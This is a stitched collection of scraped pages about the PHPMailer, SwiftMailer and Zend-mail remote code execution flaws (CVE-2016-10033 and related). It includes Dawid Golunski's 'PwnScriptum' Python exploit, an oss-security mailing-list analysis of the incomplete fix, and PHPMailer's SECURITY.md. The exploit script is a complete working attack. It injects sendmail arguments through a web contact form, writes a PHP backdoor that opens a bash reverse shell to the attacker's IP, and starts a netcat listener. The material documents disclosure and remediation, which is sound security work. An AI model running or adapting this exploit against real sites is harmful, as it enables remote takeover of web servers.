8. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection Exploit (CVE-2016-4264)](http://legalhackers.com/videos/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)

# Security Papers

1. [Pwning PHP mail() function For Fun And Remote Code Execution - New Exploitation Techniques And Vectors](https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html)

[Follow @dawid\_golunski](https://twitter.com/%40dawid_golunski)

Legal Hackers © 2024



=== Content from legalhackers.com_1b0c5280_20250126_062432.html ===
#!/usr/bin/python
intro = """\033[94m
\_\_ \_\_ \_\_ \_\_ \_\_
/ / \_\_\_ \_\_\_\_ \_\_\_\_\_ \_/ / / / / /\_\_\_ \_\_\_\_\_\_/ /\_\_\_\_\_ \_\_\_\_\_\_\_\_\_\_
/ / / \_ \/ \_\_ `/ \_\_ `/ / / /\_/ / \_\_ `/ \_\_\_/ //\_/ \_ \/ \_\_\_/ \_\_\_/
/ /\_\_\_/ \_\_/ /\_/ / /\_/ / / / \_\_ / /\_/ / /\_\_/ ,< / \_\_/ / (\_\_ )
/\_\_\_\_\_/\\_\_\_/\\_\_, /\\_\_,\_/\_/ /\_/ /\_/\\_\_,\_/\\_\_\_/\_/|\_|\\_\_\_/\_/ /\_\_\_\_/
/\_\_\_\_/
PHPMailer / Zend-mail / SwiftMailer - Remote Code Execution Exploit
a.k.a "PwnScriptum"
CVE-2016-10033 + CVE-2016-10045 + CVE-2016-10034 + CVE-2016-10074
This PoC exploit aims to execute a reverse shell on the target in
the context of the web-server user via vulnerable PHP email library.
Discovered and Coded by:
\033[1;34m
Dawid Golunski
https://legalhackers.com
t: @dawid\_golunski for updates
\033[0m
\033[94m
P.$. For testing only! Don't break the Web ;)
\033[0m
"""
info = """
[Version]
Limited PoC (ver. 1.1)
[PoC Video]
See the the exploit in action at:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
[Info]
This exploit targets a common webapp component - Contact Form.
It combines payloads for the following vulns:
1. PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
2. PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045 / escapeshell bypass)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln.html
3. SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html
4. Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html
[Usage]
./PwnScriptum\_RCE\_exploit.py [-h] -url WEBAPP\_BASE\_URL -cf CONTACT\_SCRIPT
[-d TARGET\_UP\_DIR] -ip ATTACKERS\_IP
[-p ATTACKERS\_PORT] [--version]
[--post-action POST\_ACTION]
[--post-name POST\_NAME]
[--post-email POST\_EMAIL]
[--post-msg POST\_MSG]
Note, make sure the contact form matches the default field names (send/name/email/msg).
Otherwise override with --post-msg=message\_box for example.
"""
import os
import argparse
import time
import urllib
import urllib2
import socket
import sys
# The Main Meat
print intro
# Show info
if '-H' in sys.argv:
print info
exit(0)
# Parse input args
parser = argparse.ArgumentParser(prog='PwnScriptum\_RCE\_exploit.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit (a.k.a \'PwnScriptum\')\nDiscovered by Dawid Golunski (https://legalhackers.com)')
parser.add\_argument('-H', action='store\_true', default="false", required=False, help='Full Help / Info Page')
parser.add\_argument('-url', dest='WEBAPP\_BASE\_URL', required=True, help='WebApp Base Url')
parser.add\_argument('-cf', dest='CONTACT\_SCRIPT', required=True, help='Contact Form scriptname')
parser.add\_argument('-d' , dest='TARGET\_UP\_DIR', required=False, help='Target Upload Dir', default="upload")
parser.add\_argument('-ip', dest='ATTACKERS\_IP', required=True, help='Attackers Public IP for RevShell')
parser.add\_argument('-p', dest='ATTACKERS\_PORT', required=False, help='Attackers Port for RevShell listener', default="8080")
parser.add\_argument('--version', action='version', version='%(prog)s 1.1 Limited PoC')
parser.add\_argument('--post-action', dest='POST\_ACTION', required=False, help='Overrides POST "action" field name', default="send")
parser.add\_argument('--post-name', dest='POST\_NAME', required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add\_argument('--post-email', dest='POST\_EMAIL', required=False, help='Overrides POST "email" field name', default="email")
parser.add\_argument('--post-msg', dest='POST\_MSG', required=False, help='Overrides POST "message" field name', default="msg")
args = parser.parse\_args()
# Preset vars
TMOUT = 3
# Set Vars
#if args.ATTACKERS\_PORT is None:
# args.ATTACKERS\_PORT = 8080
#if args.TARGET\_UP\_DIR is None:
# args.TARGET\_UP\_DIR = "upload"
# Build the target backdoor URL here (note the "random" pid bit to avoid php code collisions on multiple runs / multiple phpfile appends ;)
BACKDOOR\_FILE = 'phpbackdoor' + str(os.getpid()) + '.php'
BACKDOOR\_URL = args.WEBAPP\_BASE\_URL.rstrip('/') + '/' + args.TARGET\_UP\_DIR + '/' + BACKDOOR\_FILE
CONTACT\_SCRIPT\_URL = args.WEBAPP\_BASE\_URL + args.CONTACT\_SCRIPT
# Show params
print """[+] Setting vars to: \n
WEBAPP\_BASE\_URL = [%s]
CONTACT\_SCRIPT = [%s]
TARGET\_UP\_DIR = [%s]
ATTACKERS\_IP = [%s]
ATTACKERS\_PORT = [%s]
CONTACT\_SCRIPT\_URL = [%s]
BACKDOOR\_FILEl = [%s]
""" % (args.WEBAPP\_BASE\_URL, args.CONTACT\_SCRIPT, args.TARGET\_UP\_DIR, args.ATTACKERS\_IP, args.ATTACKERS\_PORT, CONTACT\_SCRIPT\_URL, BACKDOOR\_FILE)
print "[+] Choose your target / payload: "
print "\033[1;34m"
print """[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)\n"""
print """[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)
The escapeshellarg() bypass :)\n"""
print """[3] SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)\n"""
print """[4] Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"""
print "\033[0m"
try:
target = int(raw\_input('[?] Select target [1-2]: '))
except ValueError:
print "Not a valid choice. Exiting\n"
exit(2)
if (target>4):
print "No such target. Exiting\n"
exit(3)
if target == 1:
# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
payload = '"attacker\\" -oQ/tmp/ -X%s/%s some"@email.com' % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
if target == 2:
# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/%s some\"@email.com" % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
if target == 3:
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
if target == 4:
# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
print "\n[+] Generated mail() payload will upload the backdoor into the '%s' dir\n" % args.TARGET\_UP\_DIR
# PHP RCE code to be saved into the backdoor php file on the target in TARGET\_UP\_DIR. E.g:
# e.g:
#RCE\_PHP\_CODE = "php phpinfo(); ?"
RCE\_PHP\_CODE = """php sleep(%d); system("/bin/bash -c 'nohup bash -i /dev/tcp/%s/%s 0<&1 2>&1' "); ?>""" % (TMOUT, args.ATTACKERS\_IP, args.ATTACKERS\_PORT)
# The form names might need to be adjusted
post\_fields = {'action': "%s" % args.POST\_ACTION, "%s" % args.POST\_NAME: 'Jas Fasola', "%s" % args.POST\_EMAIL: payload, "%s" % args.POST\_MSG: RCE\_PHP\_CODE}
# Attack
# Inject payload into PHPMailer / mail() via a Contact form. This should write out the backdoor
print "[+] Backdoor upload via the contact form at the URL '%s'\n" % CONTACT\_SCRIPT\_URL
data = urllib.urlencode(post\_fields)
req = urllib2.Request(CONTACT\_SCRIPT\_URL, data)
try:
urllib2.urlopen(req)
except urllib2.HTTPError, e:
print "[!] Got HTTP error: [%d] when uploading the payload. Check the URL!\n\n" % e.code
exit(3)
except urllib2.URLError, err:
print "[!] Got the '%s' error when uploading the payload. Check the URL!\n\n" % err.reason
exit(4)
# Check if the backdoor was uploaded correctly.
# A little trick here. The urlopen should timeout at sleep(X)-1 if the backdoor ran fine
# So we catch the timeout to find out.
# Is it uploaded ? Try to execute the PHP backdoor and the Reverse Shell within it
print "[+] Checking for the backdoor at the URL '%s'\n" % BACKDOOR\_URL
got\_timeout = 0
http\_err = 0
try:
urllib2.urlopen(BACKDOOR\_URL, timeout = (TMOUT-1))
except urllib2.HTTPError, e:
http\_err = e.code
except urllib2.URLError, err:
print "Some other error happened:", err.reason
except socket.timeout, e:
print "[\*] \033[1;32mLooking good!\033[0m The sleep() worked by the looks of it :) \nUrlopen timed out just in time for the shell :)\n"
got\_timeout = 1
if (got\_timeout != 1):
print "[!] Something went wrong... Error [%d]. Try another dir? Push through, don't give up! :)\n" % http\_err
exit(2)
# Spawn the shell and wait for the sleep() PHP call to finish before /bin/bash is called
print "[+] We should get a shell if we got till here! Spawning netcat now! :)\n"
print "[+] \033[1;34mPlease tell me you're seeing this too... ;)\033[0m\n"
os.system("nc -v -l -p %s" % args.ATTACKERS\_PORT)
print "\n[+] Shell closed. Removed the uploaded backdoor scripts?\n"
print "\033[1;34mP.$. There's more to it :) Exiting, for now...\033[0m\n"


=== Content from openwall.com_3eabdf45_20250125_054052.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2016/12/27/9) [[next>]](2) [[<thread-prev]](../../../2016/12/27/6) [[thread-next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20161228022414.GA9106@openwall.com>
Date: Wed, 28 Dec 2016 03:24:14 +0100
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Cc: marcus@...chromedia.co.uk
Subject: Re: PHPMailer < 5.2.18 Remote Code Execution [updated advisory] [CVE-2016-10033]

Dawid,

That's another nice find of yours, thanks!

Going forward, please just "reply" to the same thread whenever you want
to share an updated advisory.  As you realized, having a new thread
means that some people reading the old thread only won't find the new.

Now, I think the fix might be incomplete:

On Tue, Dec 27, 2016 at 09:45:48AM -0200, Dawid Golunski wrote:
> The parameters include the 5th parameter of $params which allows to pass extra
> parameters to sendmail binary installed on the system as per PHP documentation
> of mail() function:
>
> <http://php.net/manual/en/function.mail.php>
>
> As can we see from:
>
> $params = sprintf('-f%s', $this->Sender);
>
> PHPMailer uses the Sender variable to build the params string.
[...]
> The vulnerability was responsibly disclosed to PHPMailer vendor.
> The vendor released a critical security release of PHPMailer 5.2.18 to fix the
> issue as notified at:
>
> <https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md>
>
> <https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md>

The fix appears to be in this commit:

<https://github.com/PHPMailer/PHPMailer/commit/4835657cd639fbd09afd33307cef164edf807cdc>

The code becomes:

        if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
            $params = sprintf('-f%s', escapeshellarg($this->Sender));
        }

PHP documentation for mail() says this about the 5th parameter:

"This parameter is escaped by escapeshellcmd() internally to prevent
command execution. escapeshellcmd() prevents command execution, but
allows to add additional parameters.  For security reasons, it is
recommended for the user to sanitize this parameter to avoid adding
unwanted parameters to the shell command."

So now we effectively have escapeshellcmd(escapeshellarg()).  Is this
combination meant to be safe?  Maybe escapeshellcmd()'s escaping of
backslashes will stop them from being treated as escape characters for
the single quotes escaped by escapeshellarg()?

PHPMailer itself uses both of these functions elsewhere, but separately,
like this:

        if (!empty($this->Sender)) {
            if ($this->Mailer == 'qmail') {
                $sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
            } else {
                $sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
            }
        } else {
            if ($this->Mailer == 'qmail') {
                $sendmail = sprintf('%s', escapeshellcmd($this->Sendmail));
            } else {
                $sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));
            }
        }

I guess this code runs when PHPMailer does not use mail().  And the code
path leading to mail() is separate.  But I did not study this in detail.
Anyway, my point is that escapeshellcmd(escapeshellarg()) is something
new to PHPMailer.  Let's see how it behaves:

$ cat phpmailer.php
#!/usr/bin/php
<?php
$from = "\"from ' -Xstuff\"@host.tld";
print "From is $from\n";
$arg = escapeshellarg($from);
print 'From is ' . $arg . " after escapeshellarg()\n";
$cmd = escapeshellcmd($arg);
print 'From is ' . $cmd . " after escapeshellcmd(escapeshellarg())\n";
#system('/bin/echo From is ' . $cmd);
mail('root@...alhost', '', '', '', '-f' . $arg);
?>
$ env - strace -fe execve ./phpmailer.php
execve("./phpmailer.php", ["./phpmailer.php"], [/* 0 vars */]) = 0
>From is "from ' -Xstuff"@host.tld
>From is '"from '\'' -Xstuff"@host.tld' after escapeshellarg()
>From is '\"from '\\'' -Xstuff\"@host.tld\' after escapeshellcmd(escapeshellarg())
Process 16698 attached
[pid 16698] execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i -f'\\\"fr"...], [/* 0 vars */]) = 0
[pid 16698] execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i", "-f\\\"from \\", "-Xstuff\"@host.tld'"], [/* 3 vars */]) = 0
sendmail: fatal: unsupported: -Xs

I ran this test on a RHEL6'ish and on a RHEL7'ish system, with their
packages of PHP, and the result is the same.

As you can see, /usr/sbin/sendmail (in this case Postfix's, which is why
it isn't accepting "-X") is being run with "-Xstuff\"@host.tld'" as a
separate argument.  (There's also some escaping by strace in this output.
But all we care about is that it's a separate argument, which strace
makes clear.)

Now, can we get a single quote character through PHPMailer's
$this->validateAddress($this->Sender)?  I did not test, but the regexps
included in there do list it among the allowed characters in some
places.  There's also the potential (risk) that this code would be run
with $patternselect == 'noregex', which does almost no validation.
(And if there's no such potential for some reason, then the code
handling 'noregex' should simply be dropped.  Not good to keep insecure
hopefully dead code.)

I didn't intend to look into this issue for real, so I'll hand it over
back to you from this point on.  Please either show how the fix is
sufficient, or confirm that it's indeed insufficient.

Either way, I think a more appropriate fix would be to implement a
trivial SMTP client in PHPMailer and have it talk to 127.0.0.1:25.
Of course, there's also the risk of SMTP command injection, so care
should be taken to avoid that, yet it's a better defined protocol and
the impact of possible injections would be less (unless they exploit a
vulnerability in the SMTP server, but having that would be an issue on
its own).

Failing that, and as another short-term workaround, a stricter sanity
check may be applied to the "Sender" address (and maybe to other
addresses as well).  Perhaps much stricter.  Unfortunately, this will
disallow use of some obscure valid-per-RFC addresses, but that's still a
good tradeoff given the risks.

Escaping is OK for trusted user input.  For untrusted and possibly
malicious input, it just doesn't provide sufficient assurance.  Maybe
PHP documentation should be revised to introduce this distinction in its
descriptions of the escaping functions and their intended use (for SQL
escaping, too, where escaping isn't as safe as prepared statements).
As the documentation currently is, it gives the impression that escaping
is somehow sufficient and is a best practice as the only safety measure
for untrusted input.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_cd7ab0c0_20250126_062455.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Fblob%2Fmaster%2FSECURITY.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Fblob%2Fmaster%2FSECURITY.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

* [Code](/PHPMailer/PHPMailer)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

## Files

 master
## Breadcrumbs

1. [PHPMailer](/PHPMailer/PHPMailer/tree/master)
/
# SECURITY.md

Copy path Blame  Blame
## Latest commit

## History

[History](/PHPMailer/PHPMailer/commits/master/SECURITY.md)37 lines (19 loc) · 7.41 KB master
## Breadcrumbs

1. [PHPMailer](/PHPMailer/PHPMailer/tree/master)
/
# SECURITY.md

Top
## File metadata and controls

* Preview
* Code
* Blame

37 lines (19 loc) · 7.41 KB[Raw](https://github.com/PHPMailer/PHPMailer/raw/refs/heads/master/SECURITY.md)
# Security notices relating to PHPMailer

Please disclose any security issues or vulnerabilities found through [Tidelift's coordinated disclosure system](https://tidelift.com/security) or to the maintainers privately.

PHPMailer 6.4.1 and earlier contain a vulnerability that can result in untrusted code being called (if such code is injected into the host project's scope by other means). If the `$patternselect` parameter to `validateAddress()` is set to `'php'` (the default, defined by `PHPMailer::$validator`), and the global namespace contains a function called `php`, it will be called in preference to the built-in validator of the same name. Mitigated in PHPMailer 6.5.0 by denying the use of simple strings as validator function names. Recorded as [CVE-2021-3603](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-3603). Reported by Vikrant Singh Chauhan via [huntr.dev](https://www.huntr.dev/).

PHPMailer versions 6.4.1 and earlier contain a possible remote code execution vulnerability through the `$lang_path` parameter of the `setLanguage()` method. If the `$lang_path` parameter is passed unfiltered from user input, it can be set to [a UNC path](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths), and if an attacker is also able to persuade the server to load a file from that UNC path, a script file under their control may be executed. This vulnerability only applies to systems that resolve UNC paths, typically only Microsoft Windows.
PHPMailer 6.5.0 mitigates this by no longer treating translation files as PHP code, but by parsing their text content directly. This approach avoids the possibility of executing unknown code while retaining backward compatibility. This isn't ideal, so the current translation format is deprecated and will be replaced in the next major release. Recorded as [CVE-2021-34551](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-34551). Reported by [Jilin Diting Information Technology Co., Ltd](https://listensec.com) via Tidelift.

PHPMailer versions between 6.1.8 and 6.4.0 contain a regression of the earlier CVE-2018-19296 object injection vulnerability as a result of [a fix for Windows UNC paths in 6.1.8](https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9). Recorded as [CVE-2020-36326](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-36326). Reported by Fariskhi Vidyan via Tidelift. 6.4.1 fixes this issue, and also enforces stricter checks for URL schemes in local path contexts.

PHPMailer versions 6.1.5 and earlier contain an output escaping bug that occurs in `Content-Type` and `Content-Disposition` when filenames passed into `addAttachment` and other methods that accept attachment names contain double quote characters, in contravention of RFC822 3.4.1. No specific vulnerability has been found relating to this, but it could allow file attachments to bypass attachment filters that are based on matching filename extensions. Recorded as [CVE-2020-13625](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-13625). Reported by Elar Lang of Clarified Security.

PHPMailer versions prior to 6.0.6 and 5.2.27 are vulnerable to an object injection attack by passing `phar://` paths into `addAttachment()` and other functions that may receive unfiltered local paths, possibly leading to RCE. Recorded as [CVE-2018-19296](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-19296). See [this article](https://knasmueller.net/5-answers-about-php-phar-exploitation) for more info on this type of vulnerability. Mitigated by blocking the use of paths containing URL-protocol style prefixes such as `phar://`. Reported by Sehun Oh of cyberone.kr.

PHPMailer versions prior to 5.2.24 (released July 26th 2017) have an XSS vulnerability in one of the code examples, [CVE-2017-11503](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-11503). The `code_generator.phps` example did not filter user input prior to output. This file is distributed with a `.phps` extension, so it is not normally executable unless it is explicitly renamed, and the file is not included when PHPMailer is loaded through composer, so it is safe by default. There was also an undisclosed potential XSS vulnerability in the default exception handler (unused by default). Patches for both issues kindly provided by Patrick Monnerat of the Fedora Project.

PHPMailer versions prior to 5.2.22 (released January 9th 2017) have a local file disclosure vulnerability, [CVE-2017-5223](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5223). If content passed into `msgHTML()` is sourced from unfiltered user input, relative paths can map to absolute local file paths and added as attachments. Also note that `addAttachment` (just like `file_get_contents`, `passthru`, `unlink`, etc) should not be passed user-sourced params either! Reported by Yongxiang Li of Asiasecurity.

PHPMailer versions prior to 5.2.20 (released December 28th 2016) are vulnerable to [CVE-2016-10045](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10045) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html), and patched by Paul Buonopane (@Zenexer).

PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html).

PHPMailer versions prior to 5.2.14 (released November 2015) are vulnerable to [CVE-2015-8476](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8476) an SMTP CRLF injection bug permitting arbitrary message sending.

PHPMailer versions prior to 5.2.10 (released May 2015) are vulnerable to [CVE-2008-5619](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-5619), a remote code execution vulnerability in the bundled html2text library. This file was removed in 5.2.10, so if you are using a version prior to that and make use of the html2text function, it's vitally important that you upgrade and remove this file.

PHPMailer versions prior to 2.0.7 and 2.2.1 are vulnerable to [CVE-2012-0796](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0796), an email header injection attack.

Joomla 1.6.0 uses PHPMailer in an unsafe way, allowing it to reveal local file paths, reported in [CVE-2011-3747](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3747).

PHPMailer didn't sanitise the `$lang_path` parameter in `SetLanguage`. This wasn't a problem in itself, but some apps (PHPClassifieds, ATutor) also failed to sanitise user-provided parameters passed to it, permitting semi-arbitrary local file inclusion, reported in [CVE-2010-4914](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-4914), [CVE-2007-2021](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2007-2021) and [CVE-2006-5734](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2006-5734).

PHPMailer 1.7.2 and earlier contained a possible DDoS vulnerability reported in [CVE-2005-1807](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-1807).

PHPMailer 1.7 and earlier (June 2003) have a possible vulnerability in the `SendmailSend` method where shell commands may not be sanitised. Reported in [CVE-2007-3215](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2007-3215).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from nmap.org_b89a31d3_20250126_062512.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
